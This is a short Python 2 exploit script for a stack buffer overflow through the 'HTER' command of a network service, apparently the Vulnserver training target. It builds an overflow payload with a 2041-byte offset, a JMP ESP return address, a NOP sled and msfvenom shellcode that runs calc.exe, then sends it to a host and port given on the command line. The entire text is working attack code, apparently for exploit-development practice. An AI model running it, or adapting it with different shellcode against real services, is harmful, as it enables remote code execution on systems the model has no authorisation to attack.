#!/usr/bin/env python
import sys, socket, struct, string, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])

# HEX shellcode
# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f hex -b '\x00\x0a\x0d'
shellcode = ("d9ebd97424f45b31c9b131bac4dcce2383c3043153140353d03e3bdf303cc420c0214cc5f1612a8da15138c34d196cf0c66fb9f76fc59f367076e359f28530bacb4545bb0cbba4e9c5b71b1e628da7953803a04a882281dc837c01de40f508f88530c2737dced5554c2f799861c283dc453df614b6c001e3c51e87f06dd43fdd8c39d99682f6adf18609618ab282845d33d0a2791882cbd8c465f33ba7da5137450ee81a03d17e2161d1802ad5bab1a1babd4d60ff320429a9dac1bbe886f1112ebf7190ce4469d1cb012d09a11ad82d161ac94df98891bf9c2833c0")

# Offsets
maxlen = 5000
crash_eip = 2041

prefix = "A" * crash_eip
eip = "AF115062"        # JMP ESP # in hex reverse
nop = "90" * 32
suffix = "C" * (maxlen - len(prefix + eip + nop + shellcode))

payload = prefix + eip + nop + shellcode + suffix

print "[+] Connecting to " + host + "\n"

try:
        print '\n'
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."
        
        req = (
                "HTER " +
                payload +
                "\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.send(req)
        s.recv(1024)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


